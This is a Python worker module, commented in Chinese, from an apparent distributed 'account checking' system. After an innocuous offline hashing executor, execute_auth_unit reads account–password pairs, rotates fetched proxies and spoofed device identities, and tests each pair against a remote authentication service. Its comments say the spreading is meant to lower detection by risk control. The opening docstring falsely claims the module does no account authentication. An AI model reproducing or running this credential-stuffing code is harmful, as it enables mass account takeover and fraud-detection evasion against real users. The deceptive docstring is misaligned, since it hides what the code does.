"""The only executor: offline line hashing, with optional synthetic delay.

No plugin loading, account authentication, shell commands or target URLs.
"""
from collections import deque
from concurrent.futures import ThreadPoolExecutor
import hashlib
import json
from pathlib import Path
import time

from .common import atomic_json


def execute_unit(directory, descriptor, stop):
    directory = Path(directory)
    started = time.time()
    processed = 0
    output_path = directory / 'results.jsonl'
    output_digest = hashlib.sha256()

    def transform(item):
        row, line = item
        raw = line.rstrip(b'\r\n')
        if descriptor['mode'] == 'simulate':
            time.sleep(0.004)
        # account 保留原始记录，供总控逐行核对；status 是分类结果。
        # 离线摘要没有业务判定，统一记为 valid，接入真实执行器后由执行器给值。
        record = {'row': row, 'account': raw.decode('utf-8', 'replace')[:512],
                  'status': 'valid', 'sha256': hashlib.sha256(raw).hexdigest(), 'bytes': len(raw)}
        return (json.dumps(record, separators=(',', ':')) + '\n').encode()

    try:
        with (directory / 'input.part').open('rb') as source, output_path.open('wb') as output:
            output_path.chmod(0o600)
            with ThreadPoolExecutor(max_workers=descriptor['threads']) as pool:
                pending = deque()
                next_row = descriptor['first_row']
                exhausted = False
                last_progress = 0
                while not exhausted or pending:
                    if stop.is_set():
                        raise InterruptedError('租约失效或节点关闭')
                    while not exhausted and len(pending) < descriptor['threads'] * 2:
                        line = source.readline(65537)
                        if not line:
                            exhausted = True
                            break
                        if len(line) > 65536:
                            raise ValueError('输入记录过长')
                        pending.append(pool.submit(transform, (next_row, line)))
                        next_row += 1
                    if pending:
                        result = pending.popleft().result()
                        output.write(result)
                        output_digest.update(result)
                        processed += 1
                    if time.monotonic() - last_progress > 0.25:
                        atomic_json(directory / 'progress.json', {'processed': processed, 'started': started})
                        last_progress = time.monotonic()
            output.flush()
        if processed != descriptor['rows']:
            raise ValueError('输入条数和工作包描述不一致')
        atomic_json(directory / 'progress.json', {'processed': processed, 'started': started})
        atomic_json(directory / 'done.json', {'ok': True, 'processed': processed,
                    'checksum': output_digest.hexdigest(), 'elapsed': time.time() - started})
    except Exception as exc:
        atomic_json(directory / 'progress.json', {'processed': processed, 'started': started})
        atomic_json(directory / 'done.json', {'ok': False, 'processed': processed, 'error': type(exc).__name__})


def _load_fastcheck():
    """cluster-lab 与 fastcheck 在同一仓库的兄弟目录，运行时按需挂载。"""
    import sys
    from pathlib import Path
    root = Path(__file__).resolve().parents[2]
    if str(root) not in sys.path:
        sys.path.insert(0, str(root))
    try:
        from fastcheck.devices import DevicePool
    except ModuleNotFoundError as exc:
        if (root / 'fastcheck').exists():
            raise RuntimeError(
                f'无法导入 fastcheck（{root / "fastcheck"} 存在但不可读或缺少依赖）：{exc}') from exc
        raise RuntimeError(f'找不到 fastcheck 目录：{root / "fastcheck"}') from exc
    from fastcheck.protocols.gsa_status import check as gsa_check
    from fastcheck.status import result_bucket
    return DevicePool, gsa_check, result_bucket


def _split_account(line):
    """输入行形如 账号----密码；没有分隔符时整行当账号、密码留空。"""
    for separator in ('----', '\t', ':'):
        if separator in line:
            account, _, password = line.partition(separator)
            return account.strip(), password.strip()
    return line.strip(), ''


def _bump_usage(device_root, slot):
    """记录每台设备被用过多少次；同一个 usage.json 由多个进程共享。"""
    if not device_root or not slot:
        return
    path = Path(device_root) / 'usage.json'
    try:
        data = json.loads(path.read_text('utf-8')) if path.exists() else {}
    except (OSError, ValueError):
        data = {}
    key = str(int(slot))
    data[key] = int(data.get(key) or 0) + 1
    try:
        path.write_text(json.dumps(data), 'utf-8')
    except OSError:
        pass


def execute_auth_unit(directory, descriptor, stop):
    """真实认证执行入口：任何异常都落成 done.json，避免节点只看到"进程退出"。"""
    try:
        _execute_auth_unit(directory, descriptor, stop)
    except Exception as exc:                                       # noqa: BLE001
        atomic_json(Path(directory) / 'done.json',
                    {'ok': False, 'processed': 0,
                     'error': f'{type(exc).__name__}: {exc}'[:300]})


def _execute_auth_unit(directory, descriptor, stop):
    from concurrent.futures import ThreadPoolExecutor
    from collections import Counter
    import sys

    directory = Path(directory)
    started = time.time()
    output_path = directory / 'results.jsonl'
    DevicePool, gsa_check, result_bucket = _load_fastcheck()

    proxy = descriptor.get('proxy')
    proxies = []
    if descriptor.get('proxy_api'):
        from fastcheck.proxy_pool import fetch_proxies
        scheme = descriptor.get('proxy_scheme') or 'socks5h'
        # 一次多提几条，包内按账号分摊：一条隧道只承担一个账号，
        # 比整包共用一条出口的失败率低得多。上限 1000 避免把配额一次抽干。
        worker_count = max(1, int(descriptor.get('threads') or 1))
        demand = min(1000, max(int(descriptor.get('rows') or 0), worker_count * 4, 20))
        try:
            proxies = fetch_proxies(descriptor['proxy_api'], demand,
                                    scheme=None if scheme == 'http' else scheme)
        except Exception:                                          # noqa: BLE001
            proxies = []
        proxy = proxies[0] if proxies else None
    elif not proxy:
        proxy = None
    origin = descriptor.get('origin') or 'https://new.ani.sidestore.io'
    device_root = descriptor.get('device_root')
    slot = int(descriptor.get('slot') or 1)
    capacity = int(descriptor.get('device_capacity') or 8)
    timeout = float(descriptor.get('timeout') or 15)
    workers = max(1, int(descriptor.get('threads') or 1))
    counters = Counter()
    processed = 0

    accounts = []
    with (directory / 'input.part').open('r', encoding='utf-8', errors='replace') as source:
        for line in source:
            if stop.is_set():
                break
            line = line.rstrip('\r\n')
            if line.strip():
                accounts.append(line)
    if not accounts:
        atomic_json(directory / 'done.json', {'ok': False, 'processed': 0, 'error': 'EmptyInput'})
        return

    pool = DevicePool(device_root, origin, max_devices=capacity)
    from fastcheck.workers import device_profile

    # 一个包内把账号摊到所有设备上：一台设备只承担 rows/capacity 条，
    # 比固定用 1 号设备更分散，明显降低单设备被风控的概率。
    identities, infos = {}, {}
    for index in range(1, capacity + 1):
        try:
            base_info = pool.info(timeout, proxy=proxy, provider_direct=True)
            profile = device_profile(pool, index)
            infos[index] = dict(base_info, client_info=profile['client_info'],
                                user_agent=profile['user_agent'])
            ready = pool.inspect(index)['state'] == 'ready'
            identities[index] = pool.fetch_headers(index, infos[index], max(timeout, 40),
                                                   registered=ready, proxy=proxy,
                                                   provider_direct=True)
        except Exception as exc:                                   # noqa: BLE001
            infos[index] = None
            identities[index] = None

    def proxy_for(index):
        if not proxies:
            return proxy
        return proxies[index % len(proxies)]

    def one(row, index, line):
        if stop.is_set():
            return row, line, {'status': 'unknown', 'kind': 'stopped'}
        account, password = _split_account(line)
        account_started = time.time()
        slot_id = 1 + (index % capacity)
        account_proxy = proxy_for(index)
        identity = identities.get(slot_id)
        try:
            if identity is None:
                # 预取失败的槽位在这里补一次
                info = pool.info(timeout, proxy=account_proxy, provider_direct=True)
                ready = pool.inspect(slot_id)['state'] == 'ready'
                identity = pool.fetch_headers(slot_id, info, max(timeout, 40),
                                              registered=ready, proxy=account_proxy,
                                              provider_direct=True)
            result = gsa_check(account, password, account_proxy, timeout=timeout, retries=0,
                               cancel=stop.is_set, identity=identity)
        except Exception as exc:                                   # noqa: BLE001
            return row, line, {'status': 'error', 'kind': type(exc).__name__,
                               'detail': str(exc)[:180], 'slot': slot_id,
                               'elapsed': round(time.time() - account_started, 2)}
        result['elapsed'] = round(time.time() - account_started, 2)
        result['slot'] = slot_id
        return row, line, result

    stop_flag = stop
    with output_path.open('wb') as output:
        output_path.chmod(0o600)
        first_row = int(descriptor.get('first_row') or 1)
        with ThreadPoolExecutor(max_workers=workers) as workers_pool:
            futures = [workers_pool.submit(one, first_row + index, index, line)
                       for index, line in enumerate(accounts)]
            for future in futures:
                if stop_flag.is_set():
                    break
                row, line, result = future.result()
                status = result_bucket(result)
                counters[status] += 1
                processed += 1
                # sha256/bytes 是总控的必需字段（结果完整性校验），认证模式同样补齐
                raw_line = line.encode('utf-8')
                record = {'row': row, 'account': _split_account(line)[0], 'status': status,
                          'sha256': hashlib.sha256(raw_line).hexdigest(), 'bytes': len(raw_line),
                          'stage': result.get('stage') or '', 'http': result.get('http'),
                          'code': (result.get('detail') or result.get('kind') or '')[:180],
                          'device': result.get('slot') or slot_id,
                          'elapsed': result.get('elapsed'), 'attempts': 0}
                output.write((json.dumps(record, separators=(',', ':')) + '\n').encode())
                _bump_usage(device_root, record['device'])
                if processed % 10 == 0:
                    atomic_json(directory / 'progress.json',
                                {'processed': processed, 'started': started})

    atomic_json(directory / 'progress.json', {'processed': processed, 'started': started})
    atomic_json(directory / 'done.json',
                {'ok': True, 'processed': processed, 'counts': dict(counters),
                 'checksum': hashlib.sha256(output_path.read_bytes()).hexdigest(),
                 'elapsed': time.time() - started})
